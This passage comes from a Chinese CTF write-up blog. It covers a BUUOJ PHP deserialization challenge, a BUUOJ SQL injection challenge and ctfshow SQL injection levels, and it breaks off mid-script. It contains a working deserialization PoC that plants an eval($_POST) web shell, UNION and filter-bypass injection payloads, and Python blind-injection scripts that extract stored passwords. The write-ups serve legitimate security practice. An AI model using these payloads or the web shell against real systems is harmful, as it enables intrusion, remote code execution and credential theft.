class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>主要的点是这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>这里就是要绕过 死亡exit 了，具体看<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">P神的解释</a>，利用 <code>php://filter/write=convert.base64-decode/resource=</code> 来绕过</p><p>其实也没啥好说的，找到攻击点往上推就行了，这里直接放 poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&#x27;R0SW3.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">give</span>(<span class="params"><span class="variable">$store</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="variable">$b</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;strval&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;options[<span class="string">&#x27;expore&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;give(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">array</span>(<span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;aaa&#x27;</span> . base64_encode(<span class="string">&#x27;&lt;?php eval($_POST[&quot;R0SW3&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;cache = <span class="keyword">array</span>(<span class="variable">$path</span> =&gt; <span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;complete = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>tips：由于 A 类里用的是 protected ，最后要记得 urlencode 编码。</p><p>最后直接蚁剑连或者进入文件进行RCE就行了。</p><p>flag:</p><blockquote><p>flag{4485bf1d-37bc-412f-8e24-6043aebf71a4}</p></blockquote><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>这题的难点是作者放了多个数据库，但其实没 ban 什么东西，好搞。</p><p>源码的 <code>life_on_mars.js</code> 提示了注入点(抓包也可以看出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_life</span>(<span class="params">query</span>) </span>&#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    type: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    url: <span class="string">&quot;/query?search=&quot;</span> + query,</span><br><span class="line">    data: <span class="string">&quot;&#123;&#125;&quot;</span>,</span><br><span class="line">    contentType: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">    dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">    cache: <span class="literal">false</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> table_html =</span><br><span class="line">        <span class="string">&#x27;&lt;table id=&quot;results&quot;&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Description&lt;/th&gt;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">      $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">i, item</span>) </span>&#123;</span><br><span class="line">        table_html +=</span><br><span class="line">          <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + data[i][<span class="number">0</span>] + <span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span> + data[i][<span class="number">1</span>] + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">      table_html += <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&quot;#results&quot;</span>).replaceWith(table_html);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    error: <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123; &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>/query?search=</code> 参数输入地名就可以查到数据，直接上 <code>union</code>。</p><p>前面的测试不说，当前数据库拿不到东西，直接查其他数据库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x2F;query?search&#x3D;amazonis_planitia union select 1,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><p>查到三个数据库，<code>information_schema</code>， <code>alien_code</code>， <code>aliens</code>。<code>aliens</code> 是当前数据库，<code>information_schema</code> 这个是MySQL自带的信息数据库，那么就只剩下一个了，直接上流程。</p><p>查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x2F;query?search&#x3D;amazonis_planitia union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;alien_code&#39;</span><br></pre></td></tr></table></figure><blockquote><p>[“1”,”code”]</p></blockquote><p>查列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x2F;query?search&#x3D;amazonis_planitia union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;alien_code&#39; and table_name&#x3D;&#39;code&#39;</span><br></pre></td></tr></table></figure><blockquote><p>[“1”,”id,code”]</p></blockquote><p>查数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x2F;query?search&#x3D;amazonis_planitia union select 1,group_concat(code) from alien_code.code</span><br></pre></td></tr></table></figure><blockquote><p>[“1”,”flag{8960d9d6-f9f7-43d7-9396-09f3dc305e0d}”]</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;BUUOJ-Web WriteUp&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
    <category term="BUUOJ" scheme="https://rossweisse.github.io/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow web入门 sql</title>
    <link href="https://rossweisse.github.io/2021/02/09/web%E5%AD%A6%E4%B9%A0/ctfshow%20SQL/"/>
    <id>https://rossweisse.github.io/2021/02/09/web%E5%AD%A6%E4%B9%A0/ctfshow%20SQL/</id>
    <published>2021-02-08T16:58:12.000Z</published>
    <updated>2021-07-23T03:27:15.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-SQL"><a href="#ctfshow-SQL" class="headerlink" title="ctfshow SQL"></a>ctfshow SQL</h1><p>刷一刷ctfshow的sql题，提升一下sql方面的缺陷</p><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>进入后题目给出了sql注入的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;</span><br></pre></td></tr></table></figure><p>构造一下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 4 %23 # 查询列数</span><br><span class="line">-1&#39; union select 1,2,3 %23 # 查回显点</span><br><span class="line">-1&#39; union select 1,database(),3 %23 # 爆库名</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 %23 # 爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;),3 %23 # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(username,0x7e,password) from ctfshow_user),3 %23 # 爆数据</span><br></pre></td></tr></table></figure><p>最后得到flag</p><blockquote><p>ctfshow{50392f35-7412-4264-833f-ae36542013f0}</p></blockquote><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>进入题目就看到一只可爱的小猫在晃，小猫咪虽然很可爱，但是还是得先写题</p><p>进到select模块的无过滤注入2</p><p>跟上题一样，但是回显点变为了两个</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>这题也跟171一样，但是返回结果那过滤了flag</p><p>也很简单，我们只需要去掉username的查询就好了，因为flag在username里</p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>测试了几下发现没数据，抓包发现了一个奇怪的网址</p><p><a href="http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1">http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1</a></p><p>有回显了，但是不是我们想要的，用盲注整整</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user4 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) %23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>这次没回显了，试试时间盲注</p><p>这里是代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user5 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)%23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url+datasql, timeout=<span class="number">0.5</span>)</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> left != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>这题简单的过滤了一下关键字，把select过滤了，但是没事</p><p>试试大写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">999&#39; union Select 1,2,3 %23 # 成功得到回显</span><br><span class="line">999&#39; union Select 1,(Select group_concat(username,0x7e,password) From ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>这题过滤了空格，用/**/绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(username,0x7e,password)&#x2F;**&#x2F;From&#x2F;**&#x2F;ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>过滤了空格和*号，转用%09绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999&#39;%09union%09Select%091,(Select%09group_concat(username,0x7e,password)%09From%09ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure><p>后面发现，其实还可以这样写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>这题把%09也给过滤了，但是还有多种姿势</p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>可以用上面的非预期直接一把梭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>用%0c绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure><h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>用()绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or(1&#x3D;1)%23</span><br></pre></td></tr></table></figure><h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><p>把大部分空格都过滤掉了（180还把%23也过滤了</p><p>这里采用Y4师傅的解法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>解释一下就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1 # 输入进去之后</span><br><span class="line"># sql请求语句</span><br><span class="line">where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line"># 因为and的优先级比or大，所以相当于</span><br><span class="line">where (username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;) or (id&#x3D;26and&#39;1&#39;&#x3D;&#39;1&#39;)</span><br><span class="line"># 因为or左边为false，但是右边为true，所以where的条件为true</span><br><span class="line"># tips：id&#x3D;26正好还是flag的元组，实在是太女少了</span><br></pre></td></tr></table></figure><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>输入ctfshow_user发现有回显，而且where可控</p><p>整个盲注脚本跑出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="subst">&#123;result+j&#125;</span>%&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>这题过滤了更多的东西，把where也过滤了，但是把空格放出来了</p><p>这里查到了两种解法</p><h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>解法一是参照Y4师傅的用right by进行查询</p><p>这里是盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>因为count是聚合函数，所以也可以用group by，having来查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span 